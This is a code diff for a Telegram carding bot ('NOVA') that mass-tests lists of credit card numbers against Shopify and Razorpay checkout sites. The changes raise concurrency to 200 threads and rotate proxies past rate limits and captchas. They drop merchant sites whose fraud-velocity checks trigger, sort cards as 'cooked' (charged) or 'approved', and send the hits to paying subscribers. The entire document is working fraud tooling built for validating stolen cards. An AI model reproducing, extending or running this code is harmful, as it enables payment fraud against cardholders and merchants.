+        # ---- Pick initial proxy ----
+        available_proxies = [p for p in proxy_list if not _proxy_is_banned(p)]
+        if not available_proxies:
+            return error_result(cc, "no live proxies"), False
+        random.shuffle(available_proxies)
+        proxy = available_proxies[0]
 
-        return error_result(cc, 'All sites/proxies exhausted'), False
+        # ---- Single call — gates.py rotates on 429 / captcha / dead-site ----
+        try:
+            api_resp = check_shopify_api(
+                site_url, cc, proxy,
+                all_proxies=available_proxies,
+                all_sites=[s['url'] for s in site_list],
+                max_attempts=3,
+            )
+        except Exception as e:
+            return error_result(cc, f"gate exception: {str(e)[:80]}"), False
 
+        if api_resp is None:
+            return error_result(cc, "api timeout (hard)"), False
+
+        response_text, raw_status, gateway_result = process_shopify_api_response(api_resp, price)
+        last_response = response_text
+        resp_up = response_text.upper()
+
+        # gates.py reports which site actually answered (after rotation)
+        actual_site_url = api_resp.get('site', site_url)
+        actual_site_obj = next(
+            (s for s in site_list if s['url'] == actual_site_url),
+            site_obj
+        )
+
+        # ---------- VELOCITY FAKE-SITE CHECK ----------
+        if raw_status == 'APPROVED' and ('ORDER_PLACED' in resp_up or 'CHARGED' in resp_up):
+            killed, count = _observe_cook(actual_site_url)
+            if killed:
+                _remove_fake_site(bot, chat_id, actual_site_obj,
+                                  current_sites, sites_lock)
+                return error_result(cc, "site removed: velocity"), False
+
+        # ---------- NO PRODUCT ----------
+        if 'NO PRODUCT FOUND' in resp_up or 'PRODUCT NOT FOUND' in resp_up:
+            with sites_lock:
+                temp_site_ban[actual_site_url] = time.time() + TEMP_BAN_TIME
+            return error_result(cc, "No product found"), False
+
+        # ---------- TERMINAL — return whatever gates.py got ----------
+        bin_info = get_bin_info(cc.split('|')[0])
+        return {
+            'cc': cc,
+            'response': response_text,
+            'status': raw_status,
+            'gateway': gateway_result or gateway,
+            'price': price,
+            'site': actual_site_obj.get('name', actual_site_url),
+            'site_url': actual_site_url,
+            'site_obj': actual_site_obj,
+            'proxy_used': proxy,
+            'bin_info': bin_info,
+            'timestamp': datetime.now().isoformat()
+        }, False                
+
+    # ------------------------------------------------------------------
+    # Main execution
+    # ------------------------------------------------------------------
     processed = 0
     start_time = time.time()
     last_update_time = time.time()
     status_msg = start_msg
 
-    with ThreadPoolExecutor(max_workers=50) as executor:
+    with ThreadPoolExecutor(max_workers=200) as executor:
         futures = {}
         for i, cc in enumerate(ccs):
             if is_stop_requested(chat_id, user_id):
                 unchecked_ccs = ccs[i:]
                 stopped = True
                 break
-            future = executor.submit(check_card_concurrent, cc, current_sites, current_proxies, 3)
+            live_proxies = [p for p in current_proxies if not _proxy_is_banned(p)]
+            future = executor.submit(check_card_concurrent, cc, current_sites, live_proxies, 5)
             futures[future] = cc
 
         for future in as_completed(futures):
@@ -852,11 +1367,10 @@ def process_shopify_mass_check(bot, message, start_msg, ccs, site_list, proxies,
                     unchecked_ccs.insert(0, cc)
                     stopped = True
                     break
-                
+
                 final_status = res['status']
-                
+
                 if final_status == 'APPROVED':
-                    # Check if it's a charge (cooked)
                     if 'ORDER_PLACED' in res['response'].upper() or 'CHARGED' in res['response'].upper():
                         results['cooked'].append(res)
                         if send_every_hit and (hit_pref == "both" or hit_pref == "cooked"):
@@ -865,12 +1379,18 @@ def process_shopify_mass_check(bot, message, start_msg, ccs, site_list, proxies,
                         results['approved'].append(res)
                         if send_every_hit and (hit_pref == "both" or hit_pref == "approved"):
                             send_hit(bot, chat_id, res, user_id=user_id, dm_user_id=dm_target_user_id)
-                elif final_status == 'DECLINED':
-                    results['dead'].append(res)
                 elif final_status == 'EXPIRED':
                     results['expired'].append(res)
+                elif final_status == 'DECLINED':
+                    results['dead'].append(res)
+                elif final_status == 'ERROR':
+                    if is_decline_response(res['response']):
+                        results['dead'].append(res)
+                    else:
+                        results['error'].append(res)
                 else:
                     results['error'].append(res)
+
             except FutureTimeoutError:
                 cc = futures[future]
                 results['error'].append(error_result(cc, 'Timeout'))
@@ -878,23 +1398,39 @@ def process_shopify_mass_check(bot, message, start_msg, ccs, site_list, proxies,
                 cc = futures[future]
                 results['error'].append(error_result(cc, str(e)))
 
+            # ---- TIME-BASED HEARTBEAT ----
             now = time.time()
-            if now - last_update_time > 5.0 or processed == len(futures) or stopped:
+            should_update = (
+                stopped
+                or processed == len(futures)
+                or (now - last_update_time >= 20)
+                or (processed > 0 and processed % 50 == 0 and now - last_update_time >= 10)
+            )
+            if should_update:
                 try:
                     elapsed = now - start_time
                     cpm = (processed / elapsed) * 60 if elapsed > 0 else 0
                     avg_time = elapsed / processed if processed > 0 else 0
                     progress_bar = format_progress_bar(processed, total)
-                    lr = html.escape(str(last_response or "N/A"))[:40] + ("…" if last_response and len(str(last_response))>40 else "")
+                    lr = html.escape(str(last_response or "waiting..."))[:40]
+                    if last_response and len(str(last_response)) > 40:
+                        lr += "…"
+
+                    live_proxy_count = sum(1 for p in current_proxies if not _proxy_is_banned(p))
+                    banned_proxy_count = len(current_proxies) - live_proxy_count
+                    inflight = max(0, len(futures) - processed)
+
                     msg_text = (
                         f"<b>🛍️ Shopify Multi‑Site</b>\n"
                         f"{progress_bar}\n\n"
                         f"🔥 Cooked: {len(results['cooked'])}  ✅ Approved: {len(results['approved'])}\n"
                         f"❌ Dead: {len(results['dead'])}  👋 Expired: {len(results['expired'])}\n"
                         f"⚠️ Errors: {len(results['error'])}\n\n"
+                        f"🔌 Proxies: {live_proxy_count} live · {banned_proxy_count} banned\n"
+                        f"⚙️ In-flight: {min(inflight, 50)} · queued: {max(0, inflight - 50)}\n"
                         f"⏱️ Last: {lr}\n"
                         f"⚡ {cpm:.1f} CPM | 🔥 {avg_time:.1f}s avg\n\n"
-                        f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
+                        f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>Unknownop</a></i>"
                     )
                     status_msg = safe_update_progress(bot, chat_id, status_msg, msg_text)
                     last_update_time = time.time()
@@ -916,7 +1452,7 @@ def process_shopify_mass_check(bot, message, start_msg, ccs, site_list, proxies,
         f"❌ Dead: {len(results['dead'])}  👋 Expired: {len(results['expired'])}\n"
         f"⚠️ Errors: {len(results['error'])}\n"
         f"⏱️ Time: {duration:.2f}s\n\n"
-        f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
+        f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>Unknownop</a></i>"
     )
     if status_msg:
         try:
@@ -954,6 +1490,7 @@ def process_shopify_mass_check(bot, message, start_msg, ccs, site_list, proxies,
             os.remove(fname)
         except:
             pass
+
 
 # ============================================================================
 # HIT SENDER – unchanged
@@ -1001,7 +1538,7 @@ def send_hit(bot, chat_id, res, user_id=None, dm_user_id=None):
     final_status = 'DECLINED'
     if 'ORDER_PLACED' in response_text.upper() or 'CHARGED' in response_text.upper():
         final_status = 'COOKED'
-    elif any(k in response_text.upper() for k in ['INSUFFICIENT', '3DS', 'OTP', 'AUTHENTICATION', 'CARD_ADDED', 'ADDED SUCCESSFULLY']):
+    elif any(k in response_text.upper() for k in ['INSUFFICIENT', 'INCORRECT CVC', 'CARD_ADDED', 'ADDED SUCCESSFULLY']):
         final_status = 'APPROVED'
     elif 'DECLINED' in response_text.upper() or 'CARD_DECLINED' in response_text.upper():
         final_status = 'DECLINED'
@@ -1197,7 +1734,7 @@ def process_gate_mass_check(bot, message, start_msg, ccs, gate_func, gate_name,
                 results['error'].append((cc, str(e)))
 
             now = time.time()
-            if now - last_update_time > 5.0 or processed == len(futures) or stopped:
+            if (processed % 50 == 0 or processed == len(futures) or stopped) and (now - last_update_time >= 10):
                 try:
                     elapsed = now - start_time
                     cpm = (processed / elapsed) * 60 if elapsed > 0 else 0
@@ -1411,7 +1948,7 @@ def process_razorpay_mass_check(bot, message, start_msg, ccs, sites, proxies,
                 results['error'].append((cc, str(e)))
 
             now = time.time()
-            if now - last_update_time > 5.0 or processed == len(futures) or stopped:
+            if (processed % 50 == 0 or processed == len(futures) or stopped) and (now - last_update_time >= 10):
                 try:
                     elapsed = now - start_time
                     cpm = (processed / elapsed) * 60 if elapsed > 0 else 0
@@ -1486,7 +2023,7 @@ def process_razorpay_mass_check(bot, message, start_msg, ccs, sites, proxies,
 # ============================================================================
 # VBV / 3DS CHECKER – unchanged
 # ============================================================================
-VBV_API_BASE = "http://2.25.156.218:5001"
+VBV_API_BASE = "http://2.25.67.110:5001"
 
 def vbv_checker(ccx):
     result = {
@@ -1674,6 +2211,58 @@ def setup_complete_handler(bot, site_filter_func, proxies_data,
         user_sessions_global.update(user_sessions)
 
     # ====================================================================
+    # COMMAND: /clearproxies – clear all personal proxies (user)
+    # ====================================================================
+    @bot.message_handler(commands=['clearproxies'])
+    def handle_clear_proxies(message):
+        user_id = message.from_user.id
+        if not is_user_allowed(user_id):
+            access_denied(message, "You need a subscription to clear your proxies.")
+            return
+        # Confirm with the user
+        markup = types.InlineKeyboardMarkup()
+        markup.add(
+            types.InlineKeyboardButton("✅ Yes, clear all", callback_data="clearproxies_yes"),
+            types.InlineKeyboardButton("❌ No, keep", callback_data="clearproxies_no")
+        )
+        safe_send(bot.reply_to, message,
+            "⚠️ <b>Are you sure?</b>\n\n"
+            "This will remove <b>all</b> your personal proxies from both Shopify and Razorpay pools.\n"
+            "You can then upload fresh ones via file or /addpro.",
+            parse_mode='HTML', reply_markup=markup)
+
+    # ====================================================================
+    # CALLBACK for /clearproxies
+    # ====================================================================
+    @bot.callback_query_handler(func=lambda call: call.data.startswith("clearproxies_"))
+    def clearproxies_callback(call):
+        try:
+            bot.answer_callback_query(call.id)
+        except:
+            pass
+        user_id = call.from_user.id
+        chat_id = call.message.chat.id
+
+        if call.data == "clearproxies_yes":
+            user_proxies = get_user_proxies(user_id)
+            user_proxies["shopify"] = []
+            user_proxies["razorpay"] = []
+            save_user_proxies(user_id, user_proxies)
+            msg_text = "✅ <b>All your personal proxies have been cleared.</b>\n\nYou can now add new proxies using /addpro or uploading a .txt file."
+        else:
+            msg_text = "❌ Proxy clearing cancelled. Your proxies are safe."
+
+        try:
+            bot.edit_message_text(msg_text, chat_id, call.message.message_id, parse_mode='HTML')
+        except Exception:
+            bot.send_message(chat_id, msg_text, parse_mode='HTML')
+
+        try:
+            bot.delete_message(chat_id, call.message.message_id)
+        except:
+            pass
+
+    # ====================================================================
     # COMMAND: /cleanshpro – test all user proxies for Shopify
     # ====================================================================
     @bot.message_handler(commands=['cleanshpro'])
@@ -1695,16 +2284,16 @@ def setup_complete_handler(bot, site_filter_func, proxies_data,
         checked = 0
 
         def test_one(p):
-            return p, test_proxy_for_shopify(p)
+            return p, _hard_cap(test_proxy_for_shopify, p, timeout=30)
 
-        with ThreadPoolExecutor(max_workers=30) as ex:
+        with ThreadPoolExecutor(max_workers=100) as ex:
             futures = {ex.submit(test_one, p): p for p in all_proxies}
             for fut in as_completed(futures):
                 p, ok = fut.result()
                 checked += 1
                 if ok:
                     live.append(p)
-                if checked % 10 == 0:
+                if checked % 50 == 0:
                     try:
                         safe_send(bot.edit_message_text,
                             f"🔍 Testing for Shopify: {checked}/{total}\n✅ Live: {len(live)}",
@@ -1754,7 +2343,7 @@ def setup_complete_handler(bot, site_filter_func, proxies_data,
                 checked += 1
                 if ok:
                     live.append(p)
-                if checked % 10 == 0:
+                if checked % 50 == 0:
                     try:
                         safe_send(bot.edit_message_text,
                             f"🔍 Testing for Razorpay: {checked}/{total}\n✅ Live: {len(live)}",
@@ -1857,10 +2446,26 @@ def setup_complete_handler(bot, site_filter_func, proxies_data,
         if not sites:
             safe_send(bot.reply_to, message, "You have no personal sites.\nAdd with /addmysite <url>", parse_mode='HTML')
             return
-        text = "<b>Your personal sites:</b>\n"
+
+        lines = []
         for i, s in enumerate(sites, 1):
-            text += f"{i}. {s['url']} ({s.get('name','')})\n"
-        safe_send(bot.reply_to, message, text, parse_mode='HTML')
+            name = s.get('name', s['url'].replace('https://', '').replace('http://', '').split('/')[0])
+            price = s.get('price', '0.00')
+            lines.append(f"{i}. {s['url']} (${price}) - {name}")
+
+        text = "\n".join(lines)
+
+        if len(text) > 3900:
+             filename = f"mysites_{user_id}.txt"
+             with open(filename, 'w', encoding='utf-8') as f:
+                 f.write("Your Personal Sites\n")
+                 f.write("━━━━━━━━━━━━━━━━━━━\n")
+                 f.write(text)
+             with open(filename, 'rb') as f:
+                 safe_send(bot.send_document, message.chat.id, f, caption=f"📋 Your {len(sites)} personal sites")
+             os.remove(filename)
+        else:
+             safe_send(bot.reply_to, message, f"<b>📋 Your Personal Sites ({len(sites)})</b>\n\n{text}", parse_mode='HTML')
 
     # ====================================================================
     # RAZORPAY SITE COMMANDS
@@ -2544,6 +3149,9 @@ def setup_complete_handler(bot, site_filter_func, proxies_data,
         chat_id = message.chat.id
         is_free_group = (chat_id == FREE_GROUP_ID)
 
+        # ─────────────────────────────────────────────
+        # Branch 1 — Razorpay sites file
+        # ─────────────────────────────────────────────
         if user_sessions.get(user_id, {}).get('awaiting_rz_file'):
             user_sessions[user_id]['awaiting_rz_file'] = False
             try:
@@ -2583,39 +3191,111 @@ def setup_complete_handler(bot, site_filter_func, proxies_data,
                 safe_send(bot.reply_to, message, f"❌ Error: {str(e)}")
             return
 
+        # ─────────────────────────────────────────────
+        # Branch 2 — Proxy file (2-stage fast test)
+        # ─────────────────────────────────────────────
         if user_sessions.get(user_id, {}).get('awaiting_proxy_file'):
             try:
                 file_name = message.document.file_name.lower()
                 if not file_name.endswith('.txt'):
                     safe_send(bot.reply_to, message, "❌ Only .txt files allowed.")
                     return
-                msg_loading = safe_send(bot.reply_to, message, "⏳ Reading and testing proxies...", parse_mode='HTML')
+
+                msg_loading = safe_send(bot.reply_to, message, "⏳ Reading proxies...", parse_mode='HTML')
+
                 file_info = bot.get_file(message.document.file_id)
                 file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
-                raw_proxies = [line.strip() for line in file_content.split('\n') if line.strip() and ':' in line]
+
+                # ── Normalize every line ──
+                raw = []
+                for line in file_content.split('\n'):
+                    line = line.strip()
+                    if not line or line.startswith('#'):
+                        continue
+                    n = normalize_proxy(line)
+                    if n:
+                        raw.append(n)
+                raw_proxies = list(set(raw))
+
                 if not raw_proxies:
-                    if msg_loading:
-                        safe_send(bot.edit_message_text, "❌ No valid proxies found.", message.chat.id, msg_loading.message_id)
-                    else:
-                        safe_send(bot.send_message, message.chat.id, "❌ No valid proxies found.")
+                    safe_send(bot.edit_message_text, "❌ No valid proxies found.",
+                              message.chat.id, msg_loading.message_id)
                     return
 
                 total = len(raw_proxies)
+
+                safe_send(bot.edit_message_text,
+                          f"⚡ Testing {total} proxies...\n"
+                          f"Stage 1/2 — fast connectivity filter\n"
+                          f"Stage 2/2 — Shopify + Razorpay check",
+                          message.chat.id, msg_loading.message_id)
+
+                # ─────────────────────────────────────────
+                # Stage 1 — fast connectivity (5s, 150 workers)
+                # Uses ipify.org which responds in <1s
+                # ─────────────────────────────────────────
+                alive = []
+                lock = threading.Lock()
+                checked1 = [0]
+
+                def _stage1(p):
+                    ok = _quick_alive(p, timeout=5)
+                    with lock:
+                        checked1[0] += 1
+                        n = checked1[0]
+                        if ok:
+                            alive.append(p)
+                    # Report every 25 proxies or on last one
+                    if n % 25 == 0 or n == total:
+                        try:
+                            pct = int((n / total) * 100)
+                            safe_send(bot.edit_message_text,
+                                      f"⚡ <b>Stage 1/2</b> — {pct}%\n"
+                                      f"Progress: {n}/{total}\n"
+                                      f"✅ Alive: <b>{len(alive)}</b>\n"
+                                      f"❌ Dead: <b>{n - len(alive)}</b>",
+                                      message.chat.id, msg_loading.message_id,
+                                      parse_mode='HTML')
+                        except Exception:
+                            pass
+                    return ok
+
+                with ThreadPoolExecutor(max_workers=200) as ex:
+                    list(ex.map(_stage1, raw_proxies)) 
+
+                if not alive:
+                    safe_send(bot.edit_message_text,
+                              f"✅ <b>Import complete</b>\n\n"
+                              f"📦 Uploaded: {total}\n"
+                              f"🌐 Alive: 0\n\n"
+                              f"<i>All dead or blocked.</i>",
+                              message.chat.id, msg_loading.message_id,
+                              parse_mode='HTML')
+                    return
+
+                safe_send(bot.edit_message_text,
+                          f"✅ <b>Stage 1 done</b> — {len(alive)}/{total} alive.\n\n"
+                          f"⚡ <b>Stage 2/2</b> — Shopify quality check...",
+                          message.chat.id, msg_loading.message_id,
+                          parse_mode='HTML')
+
+                # ─────────────────────────────────────────
+                # Stage 2 — Shopify quality check on survivors
+                # (30 workers — matches API capacity)
+                # ─────────────────────────────────────────
                 shopify_live = []
                 razorpay_live = []
-                status_msg = msg_loading
+                checked2 = [0]
+                total2 = len(alive)
 
-                def test_proxy(p):
-                    s_ok = test_proxy_for_shopify(p)
-                    r_ok = test_proxy_for_razorpay(p) if len(p.split(':')) == 4 else False
-                    return p, s_ok, r_ok
-
-                checked = 0
-                with ThreadPoolExecutor(max_workers=30) as ex:
-                    futures = {ex.submit(test_proxy, p): p for p in raw_proxies}
-                    for fut in as_completed(futures):
-                        p, s_ok, r_ok = fut.result()
-                        checked += 1
+                def _stage2(p):
+                    s_ok = _hard_cap(test_proxy_for_shopify, p, timeout=60, default=False)
+                    r_ok = False
+                    if len(p.split(':')) == 4:
+                        r_ok = _hard_cap(test_proxy_for_razorpay, p, timeout=30, default=False)
+                    with lock:
+                        checked2[0] += 1
+                        n = checked2[0]
                         if s_ok:
                             shopify_live.append(p)
                             add_proxy_to_user(user_id, p, "shopify")
@@ -2624,24 +3304,36 @@ def setup_complete_handler(bot, site_filter_func, proxies_data,
                             razorpay_live.append(p)
                             add_proxy_to_user(user_id, p, "razorpay")
                             add_global_proxy(p, "razorpay")
-                        if checked % 10 == 0:
-                            try:
-                                safe_send(bot.edit_message_text,
-                                    f"🔍 Testing proxies: {checked}/{total}\n"
-                                    f"✅ Shopify: {len(shopify_live)}\n"
-                                    f"✅ Razorpay: {len(razorpay_live)}",
-                                    message.chat.id, status_msg.message_id, parse_mode='HTML')
-                            except:
-                                pass
+                    # Report every 5 proxies or on last one
+                    if n % 5 == 0 or n == total2:
+                        try:
+                            pct = int((n / total2) * 100)
+                            safe_send(bot.edit_message_text,
+                                      f"⚡ <b>Stage 2/2</b> — {pct}%\n"
+                                      f"Progress: {n}/{total2}\n"
+                                      f"🛍️ Shopify: <b>{len(shopify_live)}</b>\n"
+                                      f"💎 Razorpay: <b>{len(razorpay_live)}</b>",
+                                      message.chat.id, msg_loading.message_id,
+                                      parse_mode='HTML')
+                        except Exception:
+                            pass
+                    return s_ok
 
-                final_msg = f"✅ Proxy import complete.\n\n📦 Tested: {total}\n"
-                final_msg += f"🛍️ Shopify Live: {len(shopify_live)} (added to your Shopify pool)\n"
-                final_msg += f"💎 Razorpay Live: {len(razorpay_live)} (added to your Razorpay pool)\n"
-                final_msg += f"⚙️ Use /cleanshpro and /cleanrzpro to refresh later."
-                if status_msg:
-                    safe_send(bot.edit_message_text, final_msg, message.chat.id, status_msg.message_id, parse_mode='HTML')
-                else:
-                    safe_send(bot.send_message, message.chat.id, final_msg, parse_mode='HTML')
+                with ThreadPoolExecutor(max_workers=30) as ex:
+                    list(ex.map(_stage2, alive))
+
+                final_msg = (
+                    f"✅ <b>Proxy import complete</b>\n\n"
+                    f"📦 Uploaded: <b>{total}</b>\n"
+                    f"🌐 Alive: <b>{len(alive)}</b>\n"
+                    f"🛍️ Shopify Live: <b>{len(shopify_live)}</b>\n"
+                    f"💎 Razorpay Live: <b>{len(razorpay_live)}</b>\n\n"
+                    f"⚙️ Use /cleanshpro and /cleanrzpro to refresh later."
+                )
+                safe_send(bot.edit_message_text, final_msg,
+                          message.chat.id, msg_loading.message_id,
+                          parse_mode='HTML')
+
             except Exception as e:
                 logger.error(f"Proxy upload error: {e}")
                 safe_send(bot.reply_to, message, f"❌ Error: {str(e)}")
@@ -2649,7 +3341,9 @@ def setup_complete_handler(bot, site_filter_func, proxies_data,
                 user_sessions[user_id].pop('awaiting_proxy_file', None)
             return
 
-        # CC file upload
+        # ─────────────────────────────────────────────
+        # Branch 3 — CC file (mass check)
+        # ─────────────────────────────────────────────
         if not is_free_group and not is_user_allowed(user_id):
             access_denied(message, "You need an active subscription to upload files.")
             return
@@ -2746,10 +3440,11 @@ def setup_complete_handler(bot, site_filter_func, proxies_data,
             safe_send(bot.delete_message, call.message.chat.id, call.message.message_id)
         except:
             pass
-        if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
+        user_data = user_sessions.get(user_id, {})
+        if not user_data or 'ccs' not in user_data:
             safe_send(bot.send_message, call.message.chat.id, "⚠️ Upload CCs first!", parse_mode='HTML')
             return
-        ccs = user_sessions[user_id]['ccs']
+        ccs = user_data['ccs']
         if user_id not in OWNER_ID:
             remaining = get_user_daily_remaining(user_id, load_json_func, users_file)
             if remaining < len(ccs):
@@ -2772,14 +3467,18 @@ def setup_complete_handler(bot, site_filter_func, proxies_data,
             pass
         user_id = call.from_user.id
         pref = call.data.replace("shopify_pref_", "")
-        send_to_dm = user_sessions.get(user_id, {}).get('send_results_to_dm', False)
+        user_data = user_sessions.get(user_id, {})
+        if not user_data or 'ccs' not in user_data:
+            safe_send(bot.send_message, call.message.chat.id, "⚠️ No cards found. Upload a file first.")
+            return
+        ccs = user_data['ccs']
+        send_to_dm = user_data.get('send_results_to_dm', False)
         dm_user = user_id if send_to_dm else None
 
         sites = get_filtered_sites_func()
         if not sites:
             safe_send(bot.send_message, call.message.chat.id, "❌ No sites available!")
             return
-        ccs = user_sessions[user_id]['ccs']
         proxies = get_active_proxies(user_id, "shopify")
         if not proxies:
             safe_send(bot.send_message, call.message.chat.id, "🚫 No Shopify proxies. Use /cleanshpro to refresh.")
@@ -2843,14 +3542,18 @@ def setup_complete_handler(bot, site_filter_func, proxies_data,
             pass
         user_id = call.from_user.id
         pref = call.data.replace("mysites_pref_", "")
-        send_to_dm = user_sessions.get(user_id, {}).get('send_results_to_dm', False)
+        user_data = user_sessions.get(user_id, {})
+        if not user_data or 'ccs' not in user_data:
+            safe_send(bot.send_message, call.message.chat.id, "⚠️ No cards found. Upload a file first.")
+            return
+        ccs = user_data['ccs']
+        send_to_dm = user_data.get('send_results_to_dm', False)
         dm_user = user_id if send_to_dm else None
 
-        user_sites = user_sessions.get(user_id, {}).get('personal_sites', [])
+        user_sites = user_data.get('personal_sites', [])
         if not user_sites:
             safe_send(bot.send_message, call.message.chat.id, "No personal sites found.")
             return
-        ccs = user_sessions[user_id]['ccs']
         proxies = get_active_proxies(user_id, "shopify")
         if not proxies:
             safe_send(bot.send_message, call.message.chat.id, "🚫 No Shopify proxies.")
@@ -2894,10 +3597,11 @@ def setup_complete_handler(bot, site_filter_func, proxies_data,
             safe_send(bot.delete_message, call.message.chat.id, call.message.message_id)
         except:
             pass
-        if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
+        user_data = user_sessions.get(user_id, {})
+        if not user_data or 'ccs' not in user_data:
             safe_send(bot.send_message, call.message.chat.id, "⚠️ Upload CCs first!", parse_mode='HTML')
             return
-        ccs = user_sessions[user_id]['ccs']
+        ccs = user_data['ccs']
         sites = load_rz_sites()
         if not sites:
             safe_send(bot.send_message, call.message.chat.id, "❌ No Razorpay sites. Use /addrz to add.")
@@ -2953,10 +3657,11 @@ def setup_complete_handler(bot, site_filter_func, proxies_data,
                 safe_send(bot.delete_message, call.message.chat.id, call.message.message_id)
             except:
                 pass
-            if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
+            user_data = user_sessions.get(user_id, {})
+            if not user_data or 'ccs' not in user_data:
                 safe_send(bot.send_message, call.message.chat.id, "⚠️ Upload CCs first!", parse_mode='HTML')
                 return
-            ccs = user_sessions[user_id]['ccs']
+            ccs = user_data['ccs']
             if user_id not in OWNER_ID:
                 remaining = get_user_daily_remaining(user_id, load_json_func, users_file)
                 if remaining < len(ccs):
@@ -2964,7 +3669,7 @@ def setup_complete_handler(bot, site_filter_func, proxies_data,
                     return
                 fresh_users_data = load_json_func(users_file, {})
                 user_info = fresh_users_data.get(str(user_id), {})
-                user_limit = user_info.get('limit', gate_limits.get(gate_key, 200))
+                user_limit = user_info.get('limit', 200)  # default if not set
                 if len(ccs) > user_limit:
                     ccs = ccs[:user_limit]
                     safe_send(bot.send_message, call.message.chat.id,
@@ -2984,7 +3689,7 @@ def setup_complete_handler(bot, site_filter_func, proxies_data,
                 safe_send(bot.send_message, call.message.chat.id, "⚠️ Too many mass checks globally.")
                 return
             set_user_busy(user_id, True)
-            send_to_dm = user_sessions.get(user_id, {}).get('send_results_to_dm', False)
+            send_to_dm = user_data.get('send_results_to_dm', False)
             dm_user = user_id if send_to_dm else None
             start_msg = safe_send(bot.send_message, call.message.chat.id,
                 f"⚡ <b>{gate_name} Mass Check Started...</b>\n💳 Cards: {len(ccs)}\n🔌 Proxies: {len(active_proxies)}",
